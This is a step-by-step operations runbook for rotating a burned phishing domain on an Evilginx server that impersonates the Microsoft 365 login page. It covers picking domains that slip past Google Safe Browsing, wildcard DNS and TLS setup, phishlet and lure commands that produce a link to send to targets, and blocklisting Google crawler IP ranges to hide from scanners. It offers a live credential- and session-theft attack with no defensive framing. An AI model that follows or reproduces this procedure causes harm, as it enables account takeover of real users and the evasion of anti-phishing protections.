# New Domain Setup Guide

Use this guide whenever the active phishing domain gets burned (Google Safe Browsing, PhishTank, etc.) and needs to be rotated.

---

## Step 1: Choose a New Domain

**Avoid:**
- Obvious brand lookalikes (`microsoftonline-login`, `officeliveactivate`, `login365`)
- Hyphens between brand keywords
- Domains that include Microsoft / Office / Azure in the name

**Better choices:**
- A neutral business-sounding name (`cloudverify`, `secureauth`, `identityportal`)
- A short random or generic word + TLD
- `.com`, `.net`, `.org` — avoid exotic TLDs that GSB flags faster

Register at any registrar (Namecheap, Porkbun, etc.).

---

## Step 2: DNS Setup

Point DNS to your VPS. You can use Cloudflare for DNS management (**DNS only — do NOT enable the orange cloud proxy**, it breaks evilginx TLS).

Add these records in your DNS panel:

| Type | Name | Value | TTL |
|------|------|-------|-----|
| A | `@` | `YOUR_VPS_IP` | 300 |
| A | `*` | `YOUR_VPS_IP` | 300 |

The wildcard `*` record covers all subdomains (phishlet hosts, dashboard, custom lure subdomains) automatically.

Wait for propagation — usually 2–10 minutes on Cloudflare, up to 1 hour on other registrars.

Verify:

```bash
dig +short newdomain.com
dig +short login.newdomain.com
```

Both should return your VPS IP.

---

## Step 3: Issue a Wildcard SSL Certificate

Evilginx needs a wildcard cert covering `*.newdomain.com` (and optionally the bare domain). Use Let's Encrypt with a DNS challenge — no web server needed.

```bash
certbot certonly \
  --manual \
  --preferred-challenges dns \
  -d "*.newdomain.com" \
  -d "newdomain.com"
```

Certbot will prompt you to add a `_acme-challenge` TXT record in your DNS panel. Add it, wait ~30 seconds, then press Enter to continue.

On success, certs are written to `/etc/letsencrypt/live/newdomain.com/`.

---

## Step 4: Install the Wildcard Cert

Copy the cert files into the evilginx wildcard directory:

```bash
mkdir -p /root/.evilginx/crt/wildcard
cp /etc/letsencrypt/live/newdomain.com/fullchain.pem /root/.evilginx/crt/wildcard/newdomain.com.crt
cp /etc/letsencrypt/live/newdomain.com/privkey.pem   /root/.evilginx/crt/wildcard/newdomain.com.key
```

---

## Step 5: Update Evilginx Config

Restart evilginx and update the domain at the `evilginx>` prompt:

```bash
systemctl restart evilginx
```

```
config domain newdomain.com
config ipv4 external YOUR_VPS_IP
config unauth_url https://login.microsoftonline.com
blacklist unauth
```

Verify the wildcard cert loaded — startup logs should show:

```
[wld] using wildcard certificate for *.newdomain.com
```

---

## Step 6: Update Phishlet Hostname

Disable the phishlet, update its hostname, then re-enable:

```
phishlets disable o365
phishlets hostname o365 newdomain.com
phishlets enable o365
```

Evilginx will show the active hosts (e.g. `login.newdomain.com`, `www.newdomain.com`).

---

## Step 7: Recreate Lures

Old lures reference the burned domain — delete them and create fresh ones:

```
lures
lures delete 0
lures delete 0
```

(Repeat until the list is empty — index shifts after each delete.)

Create a new lure:

```
lures create o365
lures edit 0 path /auth/login
lures get-url 0
```

Copy the lure URL — that is your new phishing link to send to targets.

To use a custom subdomain on the lure:

```
lures edit 0 hostname login365.newdomain.com
lures get-url 0
```

This outputs `https://login365.newdomain.com/auth/login`. The wildcard cert covers it automatically.

---

## Step 8: Update Dashboard Subdomain (if set)

```
config dashboardsub panel
```

Dashboard will be accessible at `https://panel.newdomain.com:5000`.

---

## Step 9: Seed the Blacklist

Append Google crawler IP ranges to block them at the IP level before they can scan the new domain:

```bash
cat >> /root/.evilginx/blacklist.txt << 'EOF'

; Google Safe Browsing / crawler ranges
66.249.64.0/19
66.249.80.0/20
66.249.90.0/24
64.233.160.0/19
72.14.192.0/18
74.125.0.0/16
209.85.128.0/17
216.58.192.0/19
216.239.32.0/19
EOF
```

Restart evilginx to reload the blacklist:

```bash
systemctl restart evilginx
```

---

## Step 10: Verify

```bash
# Cert serves correctly
curl -sI https://login.newdomain.com | head -5

# Lure URL redirects (not red-screened)
curl -sIL "https://login.newdomain.com/auth/login" | head -10

# Evilginx logs show new visitor
journalctl -u evilginx -f
```

Open the lure URL in Chrome in a fresh Incognito window. It should show the Microsoft login page with no red screen.

---

## Checklist

- [ ] New domain registered and DNS propagated
- [ ] `dig` returns VPS IP for `@` and `*.newdomain.com`
- [ ] Wildcard cert issued and placed in `~/.evilginx/crt/wildcard/`
- [ ] Startup shows `[wld] using wildcard certificate`
- [ ] `config domain newdomain.com` set
- [ ] `config unauth_url https://login.microsoftonline.com` set
- [ ] `blacklist unauth` set
- [ ] Phishlet hostname updated and re-enabled
- [ ] Old lures deleted, new lure created
- [ ] Lure URL opens cleanly in Chrome (no red screen)
- [ ] Test Telegram notification: `config telegram test`
